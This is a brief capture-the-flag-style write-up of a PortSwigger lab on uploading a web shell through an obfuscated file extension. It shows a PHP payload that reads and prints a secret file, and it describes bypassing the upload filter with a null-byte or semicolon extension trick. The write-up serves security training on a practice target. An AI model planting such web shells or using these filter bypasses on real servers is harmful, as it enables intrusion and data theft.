Link: [Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)
Difficulty: Practitioner

# Action 
Here is the payload I use with the format `.php`
```
<?php
$filename = "/home/carlos/secret";

if (file_exists($filename)) {
    $content = file_get_contents($filename);
    echo $content;
} else {
    echo "The file does not exist.";
}
?>
```

I try to upload the payload but receive this warning
<img width="948" height="133" alt="Screenshot_20261103_223323" src="https://github.com/user-attachments/assets/7b9d6f6d-618d-49b1-a39a-cbc30fb34e84" />

Then, by adding `.png` extension at the end would help me bypass this filter. As a result, the payload will be treated as a normal PNG file.
validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, therefore, endline like `;` or `%00` could truncate the payload.
<img width="1539" height="719" alt="Screenshot_20261103_225246" src="https://github.com/user-attachments/assets/a60bfbb0-a688-46c4-bd5c-17db98a0e806" />

FInally, I just need to access payload.php to retrieve the secret.

Happy Hacking ()@#!
